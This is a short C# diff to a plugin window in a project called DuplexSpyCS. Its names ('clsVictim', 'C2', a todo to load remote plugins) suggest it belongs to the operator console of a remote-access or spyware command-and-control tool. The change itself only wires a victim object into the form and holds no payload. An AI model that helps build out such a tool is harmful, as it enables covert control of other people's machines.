@@ -12,13 +12,16 @@ namespace DuplexSpyCS
 {
     public partial class frmPlugin : Form
     {
-        private string m_szPluginDirectory { get; set; }
-        private IniManager m_iniMgr = C2.ini_manager;
+        private clsVictim m_victim { get; set; }
 
-        public frmPlugin()
+        private string m_szPluginDirectory { get; set; }
+        private clsIniManager m_iniMgr = clsStore.ini_manager;
+
+        public frmPlugin(clsVictim victim)
         {
             InitializeComponent();
 
+            m_victim = victim;
             m_szPluginDirectory = m_iniMgr.Read("Plugin", "Directory");
         }
 
@@ -26,7 +29,7 @@ namespace DuplexSpyCS
         {
             listView1.Items.Clear();
 
-
+            //todo: Load remote plugin
 
             toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";
         }
